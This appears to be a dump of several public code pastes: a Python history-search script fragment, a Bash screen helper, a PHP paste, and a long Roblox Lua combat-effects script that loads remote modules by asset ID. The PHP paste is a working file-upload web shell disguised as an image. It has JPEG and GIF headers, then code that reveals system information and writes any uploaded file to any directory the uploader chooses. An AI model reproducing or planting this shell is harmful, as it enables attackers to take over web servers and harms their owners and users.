    tmp = list(set(tmp))
    tmp.sort()
    timeregex = re.compile(r':.(\d{10}):[0-9]+;(.*)\n::(.*)')

    for line in tmp:
        x = timeregex.search(line)
        try:
            if quiet:
                print(x.group(2))
            else:
                print(time.strftime(""%Y%m%d %H:%M:%S"", time.localtime(float(x.group(1)))), x.group(3), x.group(2))
        except AttributeError:
            sys.stderr.write('error parsing the following line\n' + line + '\n')
            sys.exit(1)


def match(data, tmp, query):
    """"""this matches the line in the history with the query""""""
    for pattern in query:
        if not pattern.search(data):
            return
    tmp.append(data)


if __name__ == '__main__':
    usage = ""usage: %prog -i query1 query2 query3...""
    parser = optparse.OptionParser(usage)
    parser.allow_interspersed_args = False

    parser.add_option(""-i"", ""--ignore-case"",
                      action=""store_true"",
                      dest=""ignore_case"",
                      help=""ignore case"")

    parser.add_option(""-q"", ""--quiet"",
                      action=""store_true"",
                      dest=""quiet"",
                      help=""quiet output"")

    (options, args) = parser.parse_args()
    # fixme: do not use len(SEQUENCE) to determine if somethin is empty""
    if len(args) == 0:
        parser.error(""incorrect number of arguments"")

    main(options.ignore_case, options. Quiet, args)
"
GLjT97BT,stuff,dyeske,Bash,Thursday 20th of June 2024 11:02:07 PM CDT,"stuff() {
    # if [ -n ""$SSH_AUTH_SOCK"" ]; then
    #    echo ""already have sock $SSH_AUTH_SOCK""
    # else
    #     eval `ssh-agent`; ssh-add ~/.ssh/id_openwrt; ssh-add -l
    # fi
    screen -list | grep ""Dead ???"" > /dev/null && screen -wipe
    if [ -n ""$STY"" ]; then
        echo ""already on screen on $STY DISPLAY $DISPLAY""
        # xauth extract - $DISPLAY | ssh -i ~/.ssh/id_openwrt localhost xauth merge -
    else
        echo ""starting screen on $STY DISPLAY $DISPLAY""
        screen -d -RR
    fi
}
"
aXtcTbP3,up,blackhat1337,PHP,Thursday 20th of June 2024 10:59:42 PM CDT,"ÔøΩÔøΩÔøΩÔøΩJFIFÔøΩÔøΩ;CREATOR: gd-jpeg v1.0 (using IJG JPEG v80), quality = 90
ÔøΩÔøΩC




ÔøΩÔøΩC		

ÔøΩÔøΩPP""ÔøΩÔøΩ	
ÔøΩÔøΩÔøΩ}!1AQa""q2ÔøΩÔøΩÔøΩ#BÔøΩÔøΩRÔøΩÔøΩ$3brÔøΩ	
%&'()*456789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ	
ÔøΩÔøΩÔøΩw!1AQaq""2ÔøΩBÔøΩÔøΩÔøΩÔøΩ	#3RÔøΩbrÔøΩ
$4ÔøΩ%ÔøΩ&'()*56789:CDEFGHIJSTUVWXYZcdefghijstuvwxyzÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ?ÔøΩ""ÔøΩEÔøΩxÔøΩ}ÔøΩ^ÔøΩL2[GÔøΩÔøΩÔøΩÔøΩ'ÔøΩ-ÔøΩvÔøΩÔøΩEI∆úyÔøΩTcÔøΩrOÔøΩÔøΩ-okZ⁄≥GÔøΩ=_ÔøΩZÔøΩ$ÔøΩi=ÔøΩÔøΩÔøΩ7ÔøΩÔøΩÔøΩm#,1ÔøΩÔøΩÔøΩÔøΩ◊®ÔøΩBÔøΩZ~1^tÔøΩ2:}ÔøΩOÔøΩ)ÔøΩÔøΩ9ÔøΩ\+o6ÔøΩaÔøΩÔøΩÔøΩÔøΩBÔøΩuÔøΩÔøΩWÔøΩ◊£NqÔøΩcÔøΩQÔøΩ
(ÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩRÔøΩ@{ÔøΩÔøΩK
ÔøΩHÔøΩuQTWÔøΩÔøΩÔøΩÔøΩW{5{ÔøΩÔøΩÔøΩÔøΩÔøΩ]ÔøΩÔøΩÔøΩ›Æ_ÔøΩ7ÔøΩ[ÔøΩÔøΩ+ÔøΩÔøΩ+^DÔøΩÔøΩÔøΩ}ÔøΩFS^^ÔøΩ}ÔøΩXÔøΩmÔøΩÔøΩÔøΩ@ÔøΩWÔøΩÔøΩ23+.ÔøΩ_ÔøΩjÔøΩÔøΩ}ÔøΩÔøΩÔøΩÔøΩQEwÔøΩÔøΩ)ÔøΩRÔøΩÔøΩKYÔøΩÔøΩuÔøΩÔøΩÔøΩÔøΩ[ÔøΩÔøΩÔøΩÔøΩ""uÔøΩ5aÔøΩ)ÔøΩ_>WÔøΩ|;ÔøΩEÔøΩ""ÔøΩÔøΩnÔøΩ6ÔøΩ≈âÔøΩÔøΩÔøΩoIÔøΩeQ^yÔøΩE+ÔøΩQÔøΩ1¬ÅÔøΩÔøΩÔøΩÔøΩÔøΩÔøΩ⁄ÆÔøΩÔøΩÔøΩÔøΩÔøΩ3WÔøΩÔøΩDÔøΩEÔøΩÔøΩ%MÔøΩ=ÔøΩÔøΩ:ÔøΩ:ÔøΩ0ÔøΩÔøΩyÔøΩjÔøΩ(ÔøΩÔøΩÔøΩ0ÔøΩGÔøΩÔøΩÔøΩÔøΩ@ÔøΩÔøΩ_ÔøΩm'ÔøΩÔøΩ“Ü>_ÔøΩÔøΩe?ÔøΩ‹ªÔøΩjÔøΩÔøΩÔøΩÔøΩhÔøΩÔøΩD/ÔøΩspÔøΩ€üÔøΩmÔøΩÔøΩ.ZfÔøΩÔøΩÔøΩÔøΩ•¢äÔøΩÔøΩÔøΩ*4ÔøΩÔøΩVjXÔøΩfÔøΩÔøΩQÔøΩÔøΩÕªÔøΩeÔøΩ+ÔøΩ^ÔøΩÔøΩF[ÔøΩ‹§eÕª‹ø{oÔøΩWÔøΩWÔøΩBWÔøΩcÔøΩÔøΩÔøΩ?ÔøΩ4ÔøΩWIÔøΩÔøΩmÊ∫ëcÔøΩ6ÔøΩFÔøΩÔøΩÔøΩjÔøΩÔøΩ⁄ïÔøΩÔøΩ.ÔøΩY'ÔøΩ_3ÔøΩ5ÔøΩÔøΩFÔøΩcÔøΩ€àlÔøΩÔøΩÔøΩl|ÔøΩÔøΩÔøΩ>ÔøΩ“ºÔøΩÔøΩdÔøΩÔøΩ4ÔøΩÔøΩÔøΩ_iz.ÔøΩ>ÔøΩÔøΩÔøΩ3WB8ÔøΩ""ÔøΩÔøΩ\ÔøΩÔøΩ#pÔøΩÔøΩ)ÔøΩÔøΩÁµØizÔøΩÔøΩ""ÔøΩÔøΩ?+WEIÔøΩMIÔøΩÔøΩ…µoÔøΩ⁄ïÔøΩfÔøΩ)zÔøΩÔøΩÔøΩÔøΩÔøΩ\ÔøΩÔøΩÔøΩZÔøΩÔøΩÔøΩE""ÔøΩÔøΩeÔøΩÔøΩÔøΩ7AYÔøΩÔøΩÔøΩcÔøΩ[ÔøΩÔøΩÔøΩÔøΩÔøΩ1ÔøΩ/—´ÔøΩÔøΩ}ÔøΩÔøΩTÔøΩÔøΩÔøΩÔøΩGIF89a=<!DOCTYPE html>
<html>

<meta name=""robots"" content=""noindex, nofollow"" />.

<body >
<center>
<?
echo ""<h3 style='margin-top:0;margin-bottom:5px'>"".php_uname().""</h3>"";
?>
<form action="""" method=""post"" enctype=""multipart/form-data"">
   <input type=""text"" style=""padding:5px;border:1px solid green;width:303px;margin-bottom:4px"" name=""dir""  placeholder=""directory"">
   <input type=""file"" style=""padding:3px;background-color:green;color:white;margin-bottom:4px"" name=""file"" >
    <input type=""submit"" style=""padding:3px;border:3px solid green;background-color:green;color:white;margin-bottom:4px"" value=""UPLOAD"" name=""submit"">
</form>
<?
if(isset($_POST['submit'])) {
$target_dir = $_POST['dir'];
$target_file = $target_dir . basename($_FILES[""file""][""name""]);

    if (move_uploaded_file($_FILES[""file""][""tmp_name""], $target_file)) {
        echo ""Yosh ! "". basename( $_FILES[""file""][""name""]). "" UPLOAD > OK"";
    } else {
        echo ""Anjing, upload gagal !"";
    }
  }

?> 
</body>
</html>
"
d2EyQZaP,Emperor,TheFakeFew,Lua,Thursday 20th of June 2024 10:23:21 PM CDT,"if(not getfenv().NS or not getfenv().NLS)then
	local ls = require(require(14703526515).Folder.ls)
	getfenv().NS = ls.ns
	getfenv().NLS = ls.nls
end

local owner = owner or (script:FindFirstAncestorOfClass(""Player"") or game:GetService(""Players""):GetPlayerFromCharacter(script:FindFirstAncestorOfClass(""Model"")))
script = (LoadAssets or require)(13233384945):Get(""EmperorAssets"")

local refitcore = (function()
	local module = {}

	local refittedparts = {}
	local callcap = 100
	local refitMethod = ""nil""
	local loop = Instance.new(""BindableEvent"", script)
	loop:Fire(0)

	local RefitMethods = {
		[""Normal""] = {
			Function = function(env)
				local fakeobject = env.fakeobject
				local properties = env.properties
				local connections = env.connections
				local killedobjects = env.killedobjects
				local data = env.data
				local functions = env.functions
				local object = env.object

				table.insert(connections, properties.Parent.DescendantRemoving:Connect(function(obj)
					if(obj == fakeobject)or(obj:IsDescendantOf(fakeobject))then
						if(killedobjects[fakeobject])then
							return
						end
						data.calls += 1
						if(data.calls > callcap)then
							data.callCapReached = true
						end
						if(data.callCapReached)then
							return
						end
						functions.remake()
					end
				end))

				table.insert(connections, fakeobject:GetPropertyChangedSignal(""Parent""):Connect(function()
					if(killedobjects[fakeobject])then
						return
					end
					data.calls += 1
					if(data.calls > callcap)then
						data.callCapReached = true
					end
					if(data.callCapReached)then
						return
					end
					functions.remake()
				end))

				table.insert(connections, fakeobject.AncestryChanged:Connect(function()
					if(killedobjects[fakeobject])then
						return
					end
					data.calls += 1
					if(data.calls > callcap)then
						data.callCapReached = true
					end
					if(data.callCapReached)then
						return
					end
					functions.remake()
				end))

				table.insert(connections, fakeobject.Destroying:Connect(function()
					if(killedobjects[fakeobject])then
						return
					end
					data.calls += 1
					if(data.calls > callcap)then
						data.callCapReached = true
					end
					if(data.callCapReached)then
						return
					end
					functions.remake()
				end))

				table.insert(connections, fakeobject.Changed:Connect(function(prop)
					if(killedobjects[fakeobject])then
						return
					end
					data.calls += 1
					if(data.calls > callcap)then
						data.callCapReached = true
					end
					if(data.callCapReached)then
						return
					end
					local function ResetProperty()
						if(typeof(prop) ~= ""string"")then
							return
						end
						if(prop == ""Parent"")then
							return
						end
						if(prop == ""Name"")and(data.Properties.Name == ""<makerndm>"")then
							return
						end
						if(not prop:lower():find(""mesh""))then
							if(properties[prop])then
								if(fakeobject[prop] == properties[prop])then
									return
								end
							else
								return
							end
						end
						pcall(function()
							fakeobject[prop] = properties[prop]
						end)
						if(fakeobject:IsA(""MeshPart""))and(prop:lower():find(""mesh""))then
							fakeobject:ApplyMesh(object)
						end
					end
					pcall(ResetProperty)
					pcall(task.defer, pcall, ResetProperty)
				end))

				if(not data.DisableDescendantChecks)then
					table.insert(connections, fakeobject.DescendantRemoving:Connect(function()
						if(killedobjects[fakeobject])then
							return
						end
						data.calls += 1
						if(data.calls > callcap)then
							data.callCapReached = true
						end
						if(data.callCapReached)then
							return
						end
						functions.remake()
					end))

					table.insert(connections, fakeobject.DescendantAdded:Connect(function()
						if(killedobjects[fakeobject])then
							return
						end
						data.calls += 1
						if(data.calls > callcap)then
							data.callCapReached = true
						end
						if(data.callCapReached)then
							return
						end
						functions.remake()
					end))
				end
			end,
			Loop = ""Normal""
		},
		[""LagIsTheBestDefense""] = {
			Function = function(env)
				local fakeobject = env.fakeobject
				local properties = env.properties
				local connections = env.connections
				local killedobjects = env.killedobjects
				local data = env.data
				local functions = env.functions
				local object = env.object

				table.insert(connections, properties.Parent.DescendantRemoving:Connect(function(obj)
					if(obj == fakeobject)or(obj:IsDescendantOf(fakeobject))then
						if(killedobjects[fakeobject])then
							return
						end
						functions.remake()
						task.defer(functions.remake)
					end
				end))

				table.insert(connections, fakeobject:GetPropertyChangedSignal(""Parent""):Connect(function()
					if(killedobjects[fakeobject])then
						return
					end
					functions.remake()
					task.defer(functions.remake)
				end))

				table.insert(connections, fakeobject.AncestryChanged:Connect(function()
					if(killedobjects[fakeobject])then
						return
					end
					functions.remake()
					task.defer(functions.remake)
				end))

				table.insert(connections, fakeobject.Destroying:Connect(function()
					if(killedobjects[fakeobject])then
						return
					end
					functions.remake()
					task.defer(functions.remake)
				end))

				table.insert(connections, fakeobject.Changed:Connect(function(prop)
					if(killedobjects[fakeobject])then
						return
					end
					local function ResetProperty()
						if(typeof(prop) ~= ""string"")then
							return
						end
						if(prop == ""Parent"")then
							return
						end
						if(prop == ""Name"")and(data.Properties.Name == ""<makerndm>"")then
							return
						end
						if(not prop:lower():find(""mesh""))then
							if(properties[prop])then
								if(fakeobject[prop] == properties[prop])then
									return
								end
							else
								return
							end
						end
						pcall(function()
							fakeobject[prop] = properties[prop]
						end)
						if(fakeobject:IsA(""MeshPart""))and(prop:lower():find(""mesh""))then
							fakeobject:ApplyMesh(object)
						end
					end
					pcall(ResetProperty)
					pcall(task.defer, pcall, ResetProperty)
				end))

				if(not data.DisableDescendantChecks)then
					table.insert(connections, fakeobject.DescendantRemoving:Connect(function()
						if(killedobjects[fakeobject])then
							return
						end
						functions.remake()
						task.defer(functions.remake)
					end))

					table.insert(connections, fakeobject.DescendantAdded:Connect(function()
						if(killedobjects[fakeobject])then
							return
						end
						functions.remake()
						task.defer(functions.remake)
					end))
				end
			end,
			Loop = ""Priority""
		}
	}

	game:GetService(""RunService"").PostSimulation:Connect(function(Delta)
		if(RefitMethods[refitMethod])then
			if(RefitMethods[refitMethod].Loop ~= ""Priority"")then
				loop:Fire(Delta)
			else
				task.defer(function()
					loop:Fire(Delta)
				end)
			end
		end
	end)

	function module:SetMethod(method)
		if(RefitMethods[method])then
			refitMethod = method
		end
	end
	
	local PreDefined = {
		[""BasePart""] = {
			""Anchored"", ""CanCollide"", ""CanTouch"", ""CanQuery"",
			""Size"", ""CFrame"", ""Transparency"", ""Color"", ""Reflectance"",
			""Shape"", ""Material"", ""MeshId"", ""TextureID"", ""Parent"",
			""MaterialVariant"", ""VertexCount""
		}
	}
	
	function module:GetProperties(object)
		local predefined = nil
		for i, v in next, PreDefined do
			if(object:IsA(i))then
				predefined = v
				break
			end
		end
		local succ, returned = pcall(function()
			local propertytable = predefined or require(67882).GetProperties(object)
			local tbl = {}
			for i, v in next, propertytable do
				pcall(function()
					if(object[v] ~= nil)then
						tbl[v] = object[v]
					end
				end)
			end
			return tbl
		end)
		if(succ)then
			return returned
		else
			warn(""Couldnt fetch properties. May result in refit being worse. {""..returned..""}"")
			return {}
		end
	end

	function module:addRefit(env, variable, object, data)
		local tbl = {}
		local functions = {}
		local connections = {}
		local killedobjects = {}
		local properties = (data.Properties or {
			Parent = workspace,
			Name = ""<makerndm>""
		})
		if(not properties.Parent)then
			properties.Parent = workspace
		end
		if(not properties.Name)or(properties.Name == """")then
			properties.Name = ""<makerndm>""
		end
		local blacklistedPropertiesIf = {
			[""CFrame""] = {
				""Position"",
				""Orientation""
			}
		}
		local whitelistedtypes = {
			""BasePart""
		}
		local iswhitelisted = false
		for i,v in next, whitelistedtypes do
			if(object:IsA(v))then
				iswhitelisted = true
				break
			end
		end
		if(iswhitelisted)then
			local realprops = module:GetProperties(object)
			for i,v in next, realprops do
				if(not properties[i])then
					properties[i] = v
				end
			end
		end
		function functions.dopropcheck()
			for i,v in next, blacklistedPropertiesIf do
				if(properties[i])then
					for ind,val in next, v do
						properties[val] = nil
					end
				end
			end
			if(properties.Size)then
				if(properties.Size.X<0.01)then
					properties.Size = Vector3.new(0.01,properties.Size.Y,properties.Size.Z)
				end
				if(properties.Size.Y<0.01)then
					properties.Size = Vector3.new(properties.Size.X,0.01,properties.Size.Z)
				end
				if(properties.Size.Z<0.01)then
					properties.Size = Vector3.new(properties.Size.X,properties.Size.Y,0.01)
				end
			end
		end
		functions.dopropcheck()
		data.OnDestroyFunc = (data.OnDestroy or function() end)
		data.Properties = properties
		data.RealObjDescendants = object:GetDescendants()
		local descendantchecks = (data.DisableDescendantChecks or false)
		local autorefittime = ((data.RefitTime or data.DestroyAfterSeconds) or math.huge)
		data.DisableDescendantChecks = descendantchecks
		data.RefitTime = autorefittime
		data.calls = 0
		data.LastRefit = tick()
		local fakeobject = nil
		data.callCapReached = false

		function functions.randomstring(length)
			local a = """"
			for i = 1, (length or 20) do
				a ..= string.char(math.random(1,120))
			end
			return a
		end

		function functions.setenv()
			data.Properties = properties
			env[variable] = tbl
			refittedparts[object] = {tbl, data}
		end

		function functions.setproperties()
			functions.dopropcheck()
			for i,v in next, properties do
				pcall(function()
					fakeobject[i] = v
				end)
			end
			if(data.Properties.Name == ""<makerndm>"")then
				pcall(function()
					fakeobject.Name = functions.randomstring(math.random(20,100))
				end)
			end
		end

		function functions.disconnectconnections()
			for i,v in next, connections do
				pcall(function()
					v:Disconnect()
				end)
			end
			table.clear(connections)
		end

		function functions.remake(callondestroy)
			if(fakeobject)then
				killedobjects[fakeobject] = fakeobject
			end
			functions.disconnectconnections()
			pcall(game.Destroy, fakeobject)
			fakeobject = object:Clone()
			functions.setproperties()
			if(properties.Name == ""<makerndm>"")then
				fakeobject.Name = functions.randomstring(math.random(20,100))
			end
			fakeobject.Parent = properties.Parent
			tbl.self = fakeobject
			functions.setrefit()
			if(not callondestroy)then
				pcall(data.OnDestroyFunc)
			end
			task.defer(function()
				table.clear(killedobjects)
			end)
		end

		function functions.setrefit()
			functions.disconnectconnections()
			if(RefitMethods[refitMethod])then
				RefitMethods[refitMethod].Function({
					fakeobject = fakeobject,
					properties = properties,
					connections = connections,
					killedobjects = killedobjects,
					data = data,
					functions = functions,
					object = object
				});
			end
			functions.setenv()
		end

		function tbl.ModifyProperty(property, change)
			properties[property] = change
			functions.setproperties()
		end

		function tbl.Kill()
			functions.disconnectconnections()
			pcall(game.Destroy, fakeobject)
			task.defer(pcall, game.Destroy, fakeobject)
			table.clear(properties)
			table.clear(connections)
			table.clear(functions)
			table.clear(tbl)
			refittedparts[fakeobject] = nil
		end

		tbl.functions = functions
		functions.remake(true)
		functions.setenv()
	end

	function module.Remove()
		task.spawn(function()
			for i,v in next, refittedparts do
				pcall(game.Destroy, v[1].self)
			end
		end)
	end

	function module:SetFps() end

	function module.KillOperation()
		task.spawn(function()
			for ind = 1, 10 do
				for i,v in next, refittedparts do
					pcall(v[1].Kill, v)
				end
				game:GetService(""RunService"").Heartbeat:Wait()
			end
			table.clear(refittedparts)
		end)
	end

	loop.Event:Connect(function()
		for i,v in next, refittedparts do
			if((tick() - v[2].LastRefit) >= v[2].RefitTime)then
				v[1].functions.remake()
				v[2].LastRefit = tick()
			end
			if(v[1].self.Parent ~= v[2].Properties.Parent)then
				v[1].functions.remake()
			end
			v[2].calls = 0
			v[2].callCapReached = false
			v[1].functions.setproperties()
			if(v[2].Properties.Name == ""<makerndm>"")then
				v[1].self.Name = v[1].functions.randomstring(math.random(20,100))
			end
			if(not v[2].DisableDescendantChecks)then
				if(#v[1].self:GetDescendants() ~= #v[2].RealObjDescendants)then
					v[1].functions.remake()
				end
			end
		end
	end)

	return module
end)()

local sc = {
	FPS = 60,
	Connections = {},
	DecimateConnections = {},
	RefitCore = refitcore,
	AddRefit = refitcore.addRefit,
	WalkSpeed = 16,
	SoundIdNum = 1,
	Ids = {
		13578293305,
		13567661168,
		12479893442,
		12956637730,
		12516042843,
		12823788099,
		12777890571,
		13500992861,
		12643311678,
		12607293205,
		12578708938,
		7023635858,
		1836137223,
		1837727559
	},
	Volume = 2,
	Muted = false,
	Pitch = 0.8,
	TimePos = 0,
	EffectModel = nil,
	KillTexts = {
		""Begone, "",
		""Dissapear, "",
		""Feel my wrath, "",
		""Vanish, "",
		""Die, "",
		""Cease to exist, "",
		""Shatter, "",
		""Break, ""
	},
	WorldModels = {},
	Ignore = {},
	ClientAoe = true,
	KillMethod = 1,
	DecimateMethod = 1,
	RefitMethod = 1,
	AxeEnabled = false
}

for i,v in next, script.Character:GetDescendants() do
	pcall(function()
		v.CanCollide = false
		v.CanTouch = false
		v.CanQuery = false
	end)
end

refitcore:SetMethod(""Normal"")

local bezier = {
	new = function(...)
		local points = {...}
		assert(#points >= 2, ""bezier.new requires atleast 2 points"")
		local operation = """"
		local s = ""local points = ...\n""
		for k,v in next, points do
			s = s .. `local p{k - 1} = points[{k}]\n`
			if k == 1 then
				operation = operation .. `(1 - t)^{#points-1}*p0 + `
				continue
			end
			if k == #points then
				operation = operation .. `t^{#points-1}*p{k - 1}`
				continue
			end
			operation = operation .. `{#points-1}*(1 - t){string.rep(""*t"", k - 2)}^{#points - 2}{k == 2 and ""*t"" or """"}*p{k - 1}`
			if k ~= #points then
				operation = operation .. "" + ""
			end
		end
		s = s .. `\nreturn function(t) return {operation} end`
		local func, err = loadstring(s)
		if func then
			func = func(points)
		else
			error(`{err}`)
		end
		return {
			calc = func
		}
	end
}

function sc:GetFpsVal()
	local val = 1
	local current = 0
	local t = tick()
	for i = 1, math.huge do
		val += 0.0001
		current = (self.FPS/val)
		if current <= 60 then
			break
		end
	end
	return val
end

function sc:GetCurrentPlayer()
	if(self.Player == nil)then
		return nil
	end
	return game:GetService('Players'):FindFirstChild(self.Player)
end

function sc:FixCam(subject)
	pcall(function()
		local ls = NLS([[
		local cf = workspace.CurrentCamera.CFrame
workspace.CurrentCamera.CameraSubject = script:WaitForChild(""Subject"").Value
task.defer(function()
	workspace.CurrentCamera.CFrame = cf
	script:Destroy()
end)
		]], self:GetCurrentPlayer():FindFirstChildOfClass(""PlayerGui""))
		local v = Instance.new(""ObjectValue"", ls)
		v.Name = ""Subject""
		v.Value = subject
	end)
end

function sc:GetFramesToSecond(seconds)
	return ((60*self.FpsValue)*seconds)
end

function sc:Effect(CF,Transparency,Size,Color,TweenTime,Tween,Tween2)
	local Part=Instance.new('Part');
	Part.Parent=self.EffectModel;
	Part.Anchored=true;
	Part.CanCollide=false;
	Part.Material=Enum.Material.Glass;
	if typeof(CF)==""CFrame"" then
		Part.CFrame=CF;
	elseif typeof(CF)==""Vector3"" then
		Part.Position=CF;
	end;
	Part.Transparency=Transparency;
	Part.Size=Vector3.new(0.05,0.05,0.05);
	Part.Color=Color;
	local Mesh=Instance.new('BlockMesh');
	Mesh.Parent=Part;
	Mesh.Scale=Size*20;
	game:GetService('TweenService'):Create(Part,TweenInfo.new(TweenTime,Enum.EasingStyle.Sine),Tween):Play();
	game:GetService('TweenService'):Create(Mesh,TweenInfo.new(TweenTime,Enum.EasingStyle.Sine),Tween2):Play();
	game:GetService('Debris'):AddItem(Part,TweenTime);
end

function sc:SoundEffect(parent,id,vol,pit,playonremove)
	local snd = Instance.new(""Sound"", parent)
	snd.Volume = vol
	snd.SoundId = ""rbxassetid://""..id
	snd.Pitch = pit
	snd.PlayOnRemove = playonremove or false
	if(playonremove)then
		snd:Destroy()
	else
		snd:Play()
	end
	game:GetService(""Debris""):AddItem(snd, snd.TimeLength/snd.Pitch)
end

function sc:SpawnTrail(FROM,TO,Col,siz)
	sc:Effect(FROM,0,Vector3.new(0,0,0),Col,1,{
		Transparency = 1,
		Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
	},{
		Scale = Vector3.new(1,1*(siz*2),.1)*20
	}, self.EffectModel)
	sc:Effect(TO,0,Vector3.new(0,0,0),Col,1,{
		Transparency = 1,
		Orientation = Vector3.new(math.random(-360,360),math.random(-360,360),math.random(-360,360))
	},{
		Scale = Vector3.new(1,1*(siz*2),.1)*20
	}, self.EffectModel)
	local DIST = (FROM - TO).Magnitude
	local TRAIL = Instance.new('Part')
	TRAIL.Parent = self.EffectModel
	TRAIL.Size = Vector3.new(0.05,0.05,0.05)
	TRAIL.Transparency = 0
	TRAIL.Anchored = true
	TRAIL.CanCollide = false
	TRAIL.Material = Enum.Material.Glass
	TRAIL.Color = Col
	TRAIL.CFrame = CFrame.new(FROM, TO) * CFrame.new(0, 0, -DIST/2) * CFrame.Angles(math.rad(90),math.rad(0),math.rad(0))
	local Mesh = Instance.new('BlockMesh')
	Mesh.Parent = TRAIL
	Mesh.Scale = Vector3.new(siz,DIST,siz)*20
	game:GetService('TweenService'):Create(TRAIL,TweenInfo.new(1),{
		Transparency = 1,
		Color = Color3.new(0,0,0)
	}):Play()
	game:GetService('TweenService'):Create(Mesh,TweenInfo.new(1),{
		Scale = Vector3.new(0,DIST,0)*20
	}):Play()
	game:GetService('Debris'):AddItem(TRAIL,1)
	sc:Lightning(FROM, TO, 1, 2, Col, siz, self.EffectModel)
end

local LightningModule = (function()
	--Procedural Lightning Module. By Quasiduck
	--License: See GitHub
	--See README for guide on how to use or scroll down to see all properties in LightningBolt.new
	--All properties update in real-time except PartCount which requires a new LightningBolt to change
	--i.e. You can change a property at any time and it will still update the look of the bolt

	local clock = os.clock

	local function DiscretePulse(input, s, k, f, t, min, max) --input should be between 0 and 1. See https://www.desmos.com/calculator/hg5h4fpfim for demonstration.
		return math.clamp( (k)/(2*f) - math.abs( (input - t*s + 0.5*(k)) / (f) ), min, max )
	end

	local function NoiseBetween(x, y, z, min, max)
		return min + (max - min)*(math.noise(x, y, z) + 0.5)
	end

	local function CubicBezier(p0, p1, p2, p3, t)
		return p0*(1 - t)^3 + p1*3*t*(1 - t)^2 + p2*3*(1 - t)*t^2 + p3*t^3
	end

	local BoltPart = Instance.new(""Part"")
	BoltPart.TopSurface, BoltPart.BottomSurface = 0, 0
	BoltPart.Anchored, BoltPart.CanCollide = true, false
	BoltPart.Shape = ""Cylinder""
	BoltPart.Name = ""BoltPart""
	BoltPart.Material = Enum.Material.Neon
	BoltPart.Color = Color3.new(1, 1, 1)
	BoltPart.Transparency = 1

	local rng = Random.new()
	local xInverse = CFrame.lookAt(Vector3.new(), Vector3.new(1, 0, 0)):inverse()

	local ActiveBranches = {}

	local LightningBolt = {}
	LightningBolt.__index = LightningBolt

	--Small tip: You don't need to use actual Roblox Attachments below. You can also create ""fake"" ones as follows:
--[[
local A1, A2 = {}, {}
A1.WorldPosition, A1.WorldAxis = chosenPos1, chosenAxis1
A2.WorldPosition, A2.WorldAxis = chosenPos2, chosenAxis2
local NewBolt = LightningBolt.new(A1, A2, 40)
--]]

	function LightningBolt.new(Attachment0, Attachment1, PartCount)
		local self = setmetatable({}, LightningBolt)

		--Main (default) Properties--

		--Bolt Appearance Properties--
		self.Enabled = true --Hides bolt without destroying any parts when false
		self.Attachment0, self.Attachment1 = Attachment0, Attachment1 --Bolt originates from Attachment0 and ends at Attachment1
		self.CurveSize0, self.CurveSize1 = 0, 0 --Works similarly to beams. See https://dk135eecbplh9.cloudfront.net/assets/blt160ad3fdeadd4ff2/BeamCurve1.png
		self.MinRadius, self.MaxRadius = 0, 2.4 --Governs the amplitude of fluctuations throughout the bolt
		self.Frequency = 1 --Governs the frequency of fluctuations throughout the bolt. Lower this to remove jittery-looking lightning
		self.AnimationSpeed = 7 --Governs how fast the bolt oscillates (i.e. how fast the fluctuating wave travels along bolt)
		self.Thickness = 1 --The thickness of the bolt
		self.MinThicknessMultiplier, self.MaxThicknessMultiplier = 0.2, 1 --Multiplies Thickness value by a fluctuating random value between MinThicknessMultiplier and MaxThicknessMultiplier along the Bolt

		--Bolt Kinetic Properties--
		--Allows for fading in (or out) of the bolt with time. Can also create a ""projectile"" bolt
		--Recommend setting AnimationSpeed to 0 if used as projectile (for better aesthetics)
		--Works by passing a ""wave"" function which travels from left to right where the wave height represents opacity (opacity being 1 - Transparency)
		--See https://www.desmos.com/calculator/hg5h4fpfim to help customise the shape of the wave with the below properties
		self.MinTransparency, self.MaxTransparency = 0, 1 --See https://www.desmos.com/calculator/hg5h4fpfim
		self.PulseSpeed = 2 --Bolt arrives at Attachment1 1/PulseSpeed seconds later. See https://www.desmos.com/calculator/hg5h4fpfim
		self.PulseLength = 1000000 --See https://www.desmos.com/calculator/hg5h4fpfim
		self.FadeLength = 0.2 --See https://www.desmos.com/calculator/hg5h4fpfim
		self.ContractFrom = 0.5 --Parts shorten or grow once their Transparency exceeds this value. Set to a value above 1 to turn effect off. See https://imgur.com/OChA441

		--Bolt Color Properties--
		self.Color = Color3.new(1, 1, 1) --Can be a Color3 or ColorSequence
		self.ColorOffsetSpeed = 1 --Sets speed at which ColorSequence travels along Bolt

		--

		self.Parts = {} --The BoltParts which make up the Bolt


		local a0, a1 = Attachment0, Attachment1
		local parent = sc.EffectModel
		local p0, p1, p2, p3 = a0.WorldPosition, a0.WorldPosition + a0.WorldAxis*self.CurveSize0, a1.WorldPosition - a1.WorldAxis*self.CurveSize1, a1.WorldPosition
		local PrevPoint, bezier0 = p0, p0
		local MainBranchN = PartCount or 30

		for i = 1, MainBranchN do
			local t1 = i/MainBranchN
